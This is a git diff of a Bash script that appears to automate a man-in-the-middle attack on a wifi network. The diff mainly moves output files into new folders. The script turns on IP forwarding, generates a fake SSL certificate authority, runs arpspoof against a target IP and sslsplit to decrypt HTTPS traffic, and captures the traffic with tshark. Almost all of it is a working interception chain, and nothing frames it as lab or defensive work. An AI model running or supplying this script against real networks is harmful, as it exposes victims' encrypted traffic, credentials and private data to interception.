@@ -3,11 +3,18 @@
 #killing any conflicting process in port 8080
 echo "Killing any conflicting process in 8080"
 sudo fuser -k 8080/tcp
+
+#Checking if output folder exists
+if ! [[ -d "output" ]]
+then
+  mkdir output
+fi
+
 #creating a capture file for tshar 
-touch capture.pcap
+touch output/capture.pcap
 
 #changing permission so that tshark can read the file
-sudo chmod o=r+w capture.pcap
+sudo chmod o=r+w output/capture.pcap
 
 #getting ip info as string
 my_input=$(netstat -nr)
@@ -27,8 +34,16 @@ echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward
 #getting wifi interface
 wifi_interface=$(iw dev | awk '$1=="Interface"{print $2}')
 
-#This generates a key for fake ssl certificate 
-openssl genrsa -out ca.key 4096
+#checking if directory of the output certificate exists
+if ! [ -d "certificate" ]
+then
+  mkdir certificate
+fi
+
+
+#This generates a key for fake ssl certificate
+
+openssl genrsa -out certificate/ca.key 4096
 #This scripts automatically generate certificate to be used  
 chmod +x core/create_certificate
 ./core/create_certificate
@@ -38,12 +53,10 @@ chmod +x core/create_certificate
 
 #cmd_1="arpspoof -i ${wifi_interface} ${ip_addr}; sleep 150"
 sudo xterm -e zsh -c "arpspoof -i ${wifi_interface} ${ip_addr}" &
-sudo xterm -e zsh -c "sslsplit -D -l ssl_log.log -k ca.key -c ca.crt -P https 127.0.0.1 8080" &
-#using tshark to save the log
-#sudo tshark -i $wifi_interface -w capture.pcap > /dev/null 2>&1 &
+sudo xterm -e zsh -c "sslsplit -D -l output/ssl_log.log -k certificate/ca.key -c certificate/ca.crt -P https 127.0.0.1 8080" &
 
-
-sudo xterm -e zsh -c "tshark -i ${wifi_interface} -w capture.pcap" &
+#using tshark to save log file
+sudo xterm -e zsh -c "tshark -i ${wifi_interface} -w output/capture.pcap" &
 
 
 
